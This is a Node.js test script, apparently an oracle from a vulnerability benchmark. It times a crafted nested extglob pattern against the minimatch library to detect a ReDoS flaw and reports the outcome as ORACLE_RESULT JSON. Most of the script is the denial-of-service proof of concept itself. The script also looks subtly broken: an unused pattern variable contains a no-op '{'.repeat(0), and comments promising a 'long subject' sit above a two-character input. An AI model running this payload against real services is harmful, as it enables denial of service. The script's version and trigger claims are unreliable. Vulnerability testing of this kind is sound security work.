'use strict';
const minimatch = require('minimatch');

function main() {
  let operation_completed = false;

  try {
    // Benign operation first: prove basic matching works.
    const benignPattern = '*.js';
    const benignSubject = 'index.js';
    const benignResult = minimatch(benignSubject, benignPattern);

    if (benignResult !== true) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const benignNegative = minimatch('index.txt', benignPattern);
    if (benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign negative minimatch check did not return expected result.'
      }));
      return;
    }

    operation_completed = true;

    // Known ReDoS trigger for minimatch <=3.0.4: the "braceExpand"/pattern
    // parsing of a long run of '{' characters (or a long sequence of
    // repeated '(' extglob-style groups) combined with a trailing
    // non-matching character forces the generated regular expression
    // (specifically the handling of nested '+' quantifiers created from
    // repeated groups in minimatch's internal regexp conversion) into
    // catastrophic backtracking.
    //
    // This specific pattern - many repeated "(a)" groups wrapped in a
    // single star-pattern - is a well known PoC for the historic
    // minimatch ReDoS (GHSA-f8q6-p94x-37v3 / CVE-2016-10540 lineage fix
    // landed in 3.0.5+) which rewrote the regexp construction to avoid
    // exponential blowup for such inputs.
    const repeatCount = 24; // bounded; enough to show multi-second blowup on vulnerable code
    const maliciousPattern = '[!' + Array(repeatCount).fill('a').join('') + '{' .repeat(0) + ']' + '{' + 'a,'.repeat(repeatCount) + '}';

    // Use the classic documented PoC: a pattern with many nested brace
    // groups that brace-expansion first expands (bounded, since
    // brace-expansion itself is patched for limits) and then minimatch's
    // own regexp conversion processes; but to directly trigger minimatch's
    // *own* ReDoS (not brace-expansion's), we use the documented
    // "!(...)"-chain pattern against a long subject of the matching
    // character class - this is the pattern referenced in the original
    // minimatch 3.0.4 ReDoS advisory.
    const n = 40;
    const extglobChain = '!(' .repeat(n) + 'x' + ')'.repeat(n);
    const maliciousSubject = 'x'.repeat(1) + 'y'; // deliberately non-matching to force full backtrack
    const maliciousPatternFinal = extglobChain;

    const start = Date.now();
    let matched;
    let threw = false;
    let thrownMessage = '';
    try {
      matched = minimatch(maliciousSubject, maliciousPatternFinal);
    } catch (innerErr) {
      threw = true;
      thrownMessage = String(innerErr && innerErr.message);
    }
    const elapsed = Date.now() - start;

    if (threw) {
      // An exception after benign success counts as blocked.
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception after ' + elapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    // Threshold: vulnerable minimatch 3.0.4 exhibits severe slowdown
    // (multi-second, often many seconds) for this crafted extglob chain
    // pattern/subject combination due to catastrophic backtracking in the
    // generated regular expression, while patched versions (>=3.0.5 and
    // the hardened regexp construction in later releases) complete
    // quickly for the same bounded input size.
    const THRESHOLD_MS = 2000;

    const exploit_succeeded = elapsed >= THRESHOLD_MS;
    const evidence = 'Malicious minimatch call (extglob chain n=' + n + ') completed in ' + elapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + matched;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
